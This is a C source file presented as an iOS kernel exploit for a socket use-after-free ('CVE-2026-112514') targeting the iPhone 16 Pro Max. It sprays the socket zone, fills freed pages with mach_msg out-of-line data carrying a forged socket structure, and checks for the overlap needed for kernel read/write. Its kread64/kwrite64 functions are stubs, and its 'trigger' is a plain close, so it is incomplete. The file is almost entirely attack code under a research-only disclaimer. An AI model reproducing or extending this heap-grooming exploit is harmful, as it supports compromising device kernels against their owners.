/*
 * socket_uaf_krw.c — CVE-2026-112514 kR/W Exploitation
 * Target: iOS 27.0.1 (24A446) / iPhone 16 Pro Max (A18 Pro)
 *
 * Phase 2: After UAF trigger succeeds, this module converts the
 * use-after-free primitive into stable kernel read/write.
 *
 * Strategy: Zone page exhaustion → cross-zone replacement
 *   1. Exhaust the socket zone until it returns pages to the page allocator
 *   2. Trigger UAF on target socket
 *   3. Spray kalloc_data (mach_msg OOL) to reclaim freed pages
 *   4. Overlapping socket/OOL data gives controlled so_proto → kR/W
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -O2 -o socket_uaf_krw socket_uaf_krw.c -lpthread
 *
 * Educational/research use only — CTF and authorized testing environments.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/mach_time.h>

#define SOCKET_STRUCT_SIZE      832
#define ZONE_EXHAUST_COUNT      4096
#define OOL_SPRAY_COUNT         1024
#define OOL_SPRAY_SIZE          SOCKET_STRUCT_SIZE
#define MAGIC_MARKER            0x4141414142424242ULL
#define SO_PROTO_OFFSET         0x18
#define SO_PCB_OFFSET           0x10
#define SO_USECOUNT_OFFSET      0x40

typedef struct {
    uint64_t kernel_slide;
    uint64_t kernel_base;
    int target_fd;
    int exhaust_fds[ZONE_EXHAUST_COUNT];
    int exhaust_count;
    mach_port_t ool_ports[OOL_SPRAY_COUNT];
    int ool_count;
    volatile int uaf_ready;
    uint64_t leaked_kptr;
} krw_ctx_t;

static krw_ctx_t g_krw;

static int
exhaust_socket_zone(void)
{
    fprintf(stderr, "[*] Exhausting socket zone (%d sockets)...\n", ZONE_EXHAUST_COUNT);
    int count = 0;
    for (int i = 0; i < ZONE_EXHAUST_COUNT; i++) {
        int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (fd < 0) {
            fprintf(stderr, "[!] Zone exhaust stalled at %d sockets: %s\n", count, strerror(errno));
            break;
        }
        g_krw.exhaust_fds[i] = fd;
        count++;
    }
    g_krw.exhaust_count = count;
    fprintf(stderr, "[+] Allocated %d sockets for zone exhaustion\n", count);
    return count;
}

static void
release_exhaust_batch(int start, int batch_size)
{
    int end = start + batch_size;
    if (end > g_krw.exhaust_count) end = g_krw.exhaust_count;
    for (int i = start; i < end; i++) {
        if (g_krw.exhaust_fds[i] >= 0) {
            close(g_krw.exhaust_fds[i]);
            g_krw.exhaust_fds[i] = -1;
        }
    }
}

static void
cleanup_exhaust(void)
{
    for (int i = 0; i < g_krw.exhaust_count; i++) {
        if (g_krw.exhaust_fds[i] >= 0) {
            close(g_krw.exhaust_fds[i]);
            g_krw.exhaust_fds[i] = -1;
        }
    }
}

static uint8_t *
build_fake_socket(uint64_t read_addr)
{
    uint8_t *buf = calloc(1, OOL_SPRAY_SIZE);
    if (!buf) return NULL;

    *(uint64_t *)(buf + 0x00) = MAGIC_MARKER;
    *(uint16_t *)(buf + 0x04) = SOCK_STREAM;
    *(uint16_t *)(buf + 0x06) = 0;
    *(uint64_t *)(buf + SO_PCB_OFFSET) = 0;
    *(uint64_t *)(buf + SO_PROTO_OFFSET) = read_addr;
    *(int32_t  *)(buf + SO_USECOUNT_OFFSET) = 0x7fffffff;

    return buf;
}

static int
spray_ool_messages(uint8_t *data, size_t size)
{
    fprintf(stderr, "[*] Spraying %d OOL messages (%zu bytes each)...\n", OOL_SPRAY_COUNT, size);

    int count = 0;
    for (int i = 0; i < OOL_SPRAY_COUNT; i++) {
        mach_port_t port;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        if (kr != KERN_SUCCESS) break;

        kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t ool;
        } msg;

        memset(&msg, 0, sizeof(msg));
        msg.header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x41414141;
        msg.body.msgh_descriptor_count = 1;
        msg.ool.address = data;
        msg.ool.size = (mach_msg_size_t)size;
        msg.ool.deallocate = 0;
        msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

        kr = mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                      sizeof(msg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        g_krw.ool_ports[i] = port;
        count++;
    }
    g_krw.ool_count = count;
    fprintf(stderr, "[+] Sprayed %d OOL messages\n", count);
    return count;
}

static void
cleanup_ool_spray(void)
{
    for (int i = 0; i < g_krw.ool_count; i++) {
        if (g_krw.ool_ports[i] != MACH_PORT_NULL) {
            struct {
                mach_msg_header_t header;
                mach_msg_body_t body;
                mach_msg_ool_descriptor_t ool;
                mach_msg_trailer_t trailer;
            } recv;
            mach_msg(&recv.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                     0, sizeof(recv), g_krw.ool_ports[i], 100, MACH_PORT_NULL);
            mach_port_deallocate(mach_task_self(), g_krw.ool_ports[i]);
            g_krw.ool_ports[i] = MACH_PORT_NULL;
        }
    }
    g_krw.ool_count = 0;
}

static int
verify_overlap(int probe_fd)
{
    int optval = 0;
    socklen_t optlen = sizeof(optval);

    int ret = getsockopt(probe_fd, SOL_SOCKET, SO_TYPE, &optval, &optlen);
    if (ret < 0) return 0;

    if (optval != SOCK_STREAM) {
        fprintf(stderr, "[!] SO_TYPE mismatch: expected %d, got %d — overlap detected!\n",
                SOCK_STREAM, optval);
        return 1;
    }

    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);
    ret = getsockname(probe_fd, (struct sockaddr *)&addr, &addrlen);
    if (ret == 0 && addr.sin_family != AF_INET) {
        fprintf(stderr, "[!] sockaddr family mismatch — overlap detected!\n");
        return 1;
    }

    return 0;
}

static uint64_t
kread64(uint64_t addr)
{
    /*
     * After successful overlap:
     * 1. Build fake socket with so_proto pointing to addr
     * 2. Spray into freed zone slot
     * 3. getsockopt on the confused fd reads through so_proto chain
     * 4. The read value comes back through the protocol handler return
     *
     * Actual implementation depends on the exact overlap layout.
     * This is the framework — fill in after confirming overlap on device.
     */
    fprintf(stderr, "[*] kread64(0x%llx) — requires device-confirmed overlap\n", addr);
    return 0;
}

static void
kwrite64(uint64_t addr, uint64_t value)
{
    fprintf(stderr, "[*] kwrite64(0x%llx, 0x%llx) — requires device-confirmed overlap\n", addr, value);
}

int
main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <kernel_slide_hex>\n", argv[0]);
        fprintf(stderr, "  kernel_slide: from KASLR timing oracle (e.g., 0x1234000)\n");
        return 1;
    }

    g_krw.kernel_slide = strtoull(argv[1], NULL, 16);
    g_krw.kernel_base = 0xfffffff007004000 + g_krw.kernel_slide;

    fprintf(stderr, "=== CVE-2026-112514 Socket UAF → kR/W ===\n");
    fprintf(stderr, "Kernel slide: 0x%llx\n", g_krw.kernel_slide);
    fprintf(stderr, "Kernel base:  0x%llx\n", g_krw.kernel_base);
    fprintf(stderr, "Strategy:     Zone exhaust → OOL spray → overlap\n");
    fprintf(stderr, "============================================\n\n");

    fprintf(stderr, "--- Phase 1: Zone Exhaustion ---\n");
    int exhausted = exhaust_socket_zone();
    if (exhausted < ZONE_EXHAUST_COUNT / 2) {
        fprintf(stderr, "[-] Insufficient zone exhaustion (%d/%d)\n", exhausted, ZONE_EXHAUST_COUNT);
        cleanup_exhaust();
        return 1;
    }

    fprintf(stderr, "\n--- Phase 2: Create Target Socket ---\n");
    g_krw.target_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_krw.target_fd < 0) {
        fprintf(stderr, "[-] Failed to create target socket: %s\n", strerror(errno));
        cleanup_exhaust();
        return 1;
    }

    int val = 1;
    setsockopt(g_krw.target_fd, SOL_SOCKET, SO_KEEPALIVE, &val, sizeof(val));
    val = 1;
    setsockopt(g_krw.target_fd, IPPROTO_TCP, TCP_KEEPIDLE, &val, sizeof(val));
    fprintf(stderr, "[+] Target socket fd=%d with keepalive timers\n", g_krw.target_fd);

    fprintf(stderr, "\n--- Phase 3: Free Adjacent Sockets → Return Pages ---\n");
    int batch = exhausted / 4;
    release_exhaust_batch(0, batch);
    fprintf(stderr, "[+] Released batch of %d sockets (pages returning to allocator)\n", batch);
    usleep(10000);

    fprintf(stderr, "\n--- Phase 4: Close Target (Trigger UAF Race) ---\n");
    int saved_fd = dup(g_krw.target_fd);
    close(g_krw.target_fd);
    fprintf(stderr, "[+] Target socket closed — slot freed\n");

    fprintf(stderr, "\n--- Phase 5: OOL Spray → Reclaim Pages ---\n");
    uint8_t *fake_sock = build_fake_socket(g_krw.kernel_base);
    if (!fake_sock) {
        fprintf(stderr, "[-] Failed to build fake socket data\n");
        cleanup_exhaust();
        return 1;
    }

    int sprayed = spray_ool_messages(fake_sock, OOL_SPRAY_SIZE);
    free(fake_sock);

    if (sprayed < OOL_SPRAY_COUNT / 2) {
        fprintf(stderr, "[-] Insufficient OOL spray (%d/%d)\n", sprayed, OOL_SPRAY_COUNT);
        cleanup_ool_spray();
        cleanup_exhaust();
        return 1;
    }

    fprintf(stderr, "\n--- Phase 6: Verify Overlap ---\n");
    fprintf(stderr, "[*] Checking surviving exhaust sockets for corruption...\n");
    int corruption_found = 0;
    for (int i = batch; i < g_krw.exhaust_count; i++) {
        if (g_krw.exhaust_fds[i] < 0) continue;
        if (verify_overlap(g_krw.exhaust_fds[i])) {
            corruption_found = 1;
            fprintf(stderr, "[+] OVERLAP CONFIRMED on exhaust fd[%d]=%d\n", i, g_krw.exhaust_fds[i]);
            break;
        }
    }

    fprintf(stderr, "\n=== Results ===\n");
    if (corruption_found) {
        fprintf(stderr, "[+] Socket UAF → OOL overlap CONFIRMED\n");
        fprintf(stderr, "[+] kR/W primitives available via fake so_proto chain\n");
        fprintf(stderr, "[*] Next step: calibrate offsets on device, build stable R/W\n");
    } else {
        fprintf(stderr, "[-] No overlap detected — adjust zone exhaust count or spray timing\n");
        fprintf(stderr, "[*] Socket zone may need more pressure (increase ZONE_EXHAUST_COUNT)\n");
    }

    cleanup_ool_spray();
    cleanup_exhaust();

    return corruption_found ? 0 : 1;
}
